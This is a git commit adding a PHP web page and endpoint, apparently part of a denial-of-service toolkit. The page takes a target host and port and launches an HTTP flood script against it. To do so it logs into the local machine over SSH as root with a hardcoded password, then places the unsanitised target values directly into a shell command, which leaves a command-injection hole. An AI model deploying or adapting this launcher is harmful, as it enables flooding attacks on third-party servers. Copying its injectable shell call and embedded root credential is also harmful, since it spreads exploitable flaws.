600ffeb22b53bfd5d6899cd5c225bcc81bd437fb
runconnor <42954504+runconnor@users.noreply.github.com>
2018-11-04 14:43:01 -0500

    Create httpfloodapi.php

---
+++ httpfloodapi.php
@@ -0,0 +1,26 @@
+<?php
+
+// Install SSH2 or else this will not work!
+
+  if (isset($_REQUEST['host']) && isset($_REQUEST['requests']) && isset($_REQUEST['port']) ){
+
+    $host = $_REQUEST['host'];
+    $time = $_REQUEST['time'];
+    $port = $_REQUEST['port'];
+
+    $connection = ssh2_connect('localhost', 22);
+    ssh2_auth_password($connection, 'root', 'Lolol123');
+
+    $stream = ssh2_exec($connection, "screen -dmS -X python pyflooder.py http://{$host} {$port} 1000");
+
+    }else{
+      
+    }
+
+?>
+<form method="POST" action="">
+<input type="text" placeholder="google.com" name="host">
+<input type="text" placeholder="80" name="port">
+<input type="text" name="requests" placeholder="1000" value="1000">
+<input type="submit">
+</form>
